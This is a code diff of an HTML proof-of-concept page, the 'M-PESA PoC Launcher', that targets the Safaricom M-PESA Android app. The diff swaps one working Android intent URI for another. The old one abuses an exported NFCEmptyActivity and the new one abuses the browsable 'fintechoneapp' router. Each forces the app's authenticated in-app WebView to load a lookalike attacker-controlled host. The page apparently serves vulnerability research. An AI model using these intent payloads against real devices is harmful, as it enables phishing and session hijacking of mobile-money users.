@@ -49,8 +49,8 @@
             background-color: #00A651;
             color: #ffffff;
             font-weight: 600;
-            font-size: 15px;
-            padding: 14px 20px;
+            font-size: 16px;
+            padding: 16px 20px;
             border-radius: 6px;
             text-decoration: none;
             margin-top: 20px;
@@ -65,12 +65,12 @@
     <div class="container">
         <h2>M-PESA PoC Launcher</h2>
         <div class="notice">
-            <strong>Prerequisite:</strong> Ensure the Safaricom M-PESA app is logged in or running in the background before tapping the button below.
+            <strong>Prerequisite:</strong> Ensure M-PESA is logged in on the device before tapping the button below.
         </div>
-        <p>Tapping the button triggers the exported <code>NFCEmptyActivity</code> router, forcing M-PESA to open the external target webpage directly inside its authenticated in-app browser frame.</p>
+        <p>Tap the button below to launch the in-app WebView via the browsable <code>fintechoneapp</code> router:</p>
         
-        <a class="launch-btn" href="intent:#Intent;component=com.safaricom.mpesa.lifestyle/com.huawei.digitalpayment.consumer.nfc.ui.activity.NFCEmptyActivity;S.saveUri=safaricomnfcpay%3A%2F%2Fopenapp%3Froute%3Dhttps%253A%252F%252Fsafaricom.co.ke.185.199.108.153.sslip.io%252F%253Fv%253D4;end">
-            🚀 Launch In-App WebView
+        <a class="launch-btn" href="intent:///webViewModule/webview?scheme_execute_key=https%3A%2F%2Fsafaricom.co.ke.185.199.108.153.sslip.io%2F%3Fv%3D4#Intent;scheme=fintechoneapp;package=com.safaricom.mpesa.lifestyle;end">
+            🚀 Open M-PESA In-App WebView
         </a>
     </div>
 </body>
